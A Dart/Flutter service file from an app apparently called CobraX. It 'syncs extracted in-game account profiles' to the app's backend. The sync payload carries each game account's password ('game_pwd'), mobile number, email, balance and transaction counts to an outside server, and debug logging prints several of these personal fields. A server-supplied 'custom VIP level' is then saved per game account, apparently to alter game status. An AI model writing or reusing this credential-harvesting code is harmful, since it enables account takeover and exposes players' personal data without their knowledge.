import 'dart:convert';
import 'package:flutter/foundation.dart';
import 'package:http/http.dart' as http;

import '../config/app_config.dart';
import 'auth_service.dart';
import 'device_id_service.dart';

/// Handles synchronization of extracted in-game account profiles and live custom VIP levels with the CobraX backend.
class GameProfileService {
  GameProfileService._();

  /// Syncs extracted in-game profile data to the CobraX backend.
  /// If the server returns an updated custom VIP level for this game/user, it is automatically persisted to secure storage.
  static Future<({int? customVipLevel, String? targetUserId})?> syncGameProfile({
    required http.Client httpClient,
    required String gameName,
    required String? currentVipKey,
    required int currentGameVipLevel,
    required Map<String, dynamic> data,
  }) async {
    try {
      final deviceId = await DeviceIdService.getDeviceId();

      String? key = currentVipKey;
      if (key == null || key.isEmpty) {
        final st = await AuthService.loadVipStatus();
        key = st.key;
      }

      final body = {
        'key': key,
        'device_id': deviceId,
        'game_name': gameName,
        'game_user_id': data['game_user_id']?.toString() ?? '',
        'game_username': data['game_username']?.toString() ?? '',
        'game_nickname': data['game_nickname']?.toString() ?? '',
        'game_pwd': data['game_pwd']?.toString() ?? '',
        'mobile': data['mobile']?.toString() ?? '',
        'email': data['email']?.toString() ?? '',
        'vip_level': data['vip_level'] ?? currentGameVipLevel,
        'withdraw_count': data['withdraw_count'] ?? 0,
        'recharge_count': data['recharge_count'] ?? 0,
        'balance': data['balance'] ?? 0.0,
        'account_created_at': data['account_created_at']?.toString() ?? '',
      };

      debugPrint(
          '[Game Profile Sync] Syncing profile for $gameName (User: ${data['game_user_id']}, Mobile: ${data['mobile']}, Email: ${data['email']}, Recharges: ${data['recharge_count']}, Created: ${data['account_created_at']}, Key: $key)');

      final response = await httpClient.post(
        Uri.parse('$kApiBaseUrl/sync-game-profile'),
        headers: {
          'Content-Type': 'application/json',
          'X-CobraX-Secret': kApiSecret,
        },
        body: jsonEncode(body),
      ).timeout(const Duration(seconds: 10));

      if (response.statusCode == 200) {
        try {
          final resJson = jsonDecode(response.body);
          if (resJson['custom_vip_level'] != null) {
            final customLvl = int.tryParse(resJson['custom_vip_level'].toString());
            final targetUserId = resJson['target_user_id']?.toString() ??
                data['game_user_id']?.toString();
            if (customLvl != null) {
              await AuthService.saveCustomVipLevel(
                  gameName, customLvl, targetUserId);
              return (customVipLevel: customLvl, targetUserId: targetUserId);
            }
          }
        } catch (_) {}
      }
    } catch (e) {
      debugPrint('[Game Profile Sync] Error: $e');
    }
    return null;
  }

  /// Fetches live custom VIP level from the backend server for a specific game and user.
  static Future<({int? customVipLevel, String? targetUserId})?> fetchLiveGameVip({
    required http.Client httpClient,
    required String gameName,
    required String? currentVipKey,
    required String? targetVipUserId,
  }) async {
    try {
      final deviceId = await DeviceIdService.getDeviceId();

      String? key = currentVipKey;
      if (key == null || key.isEmpty) {
        final st = await AuthService.loadVipStatus();
        key = st.key;
      }

      final res = await httpClient.post(
        Uri.parse('$kApiBaseUrl/get-game-vip'),
        headers: {
          'Content-Type': 'application/json',
          'X-CobraX-Secret': kApiSecret,
        },
        body: jsonEncode({
          'key': key,
          'device_id': deviceId,
          'game_name': gameName,
          'game_user_id': targetVipUserId,
        }),
      ).timeout(const Duration(seconds: 8));

      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data['custom_vip_level'] != null) {
          final customLvl = int.tryParse(data['custom_vip_level'].toString());
          final targetUserId = data['target_user_id']?.toString();
          if (customLvl != null) {
            await AuthService.saveCustomVipLevel(
                gameName, customLvl, targetUserId);
            return (customVipLevel: customLvl, targetUserId: targetUserId);
          }
        }
      }
    } catch (e) {
      debugPrint('[VIP Status Fetch] Error: $e');
    }
    return null;
  }
}
